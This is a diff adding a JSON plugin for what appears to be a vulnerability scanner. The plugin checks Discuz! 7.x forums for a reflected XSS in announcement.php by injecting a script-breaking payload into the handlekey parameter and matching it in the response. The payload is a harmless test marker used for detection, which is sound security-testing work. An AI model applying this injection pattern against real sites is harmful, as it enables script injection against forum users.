@@ -1,0 +1,23 @@
+{
+    "target":"discuz",
+    "meta":{
+        "name":    "Discuz! 7.x announcement.php XSS",
+        "remarks": "Discuz! 7.x announcement.php 存在反射型XSS漏洞",
+        "level":   3,
+        "type":    "XSS",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0044"
+        }
+    },
+    "request":{
+        "path":     "/announcement.php?infloat=yes&handlekey=123);test(700);//",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "messagehandle_123);test(700);//"
+    }
+}
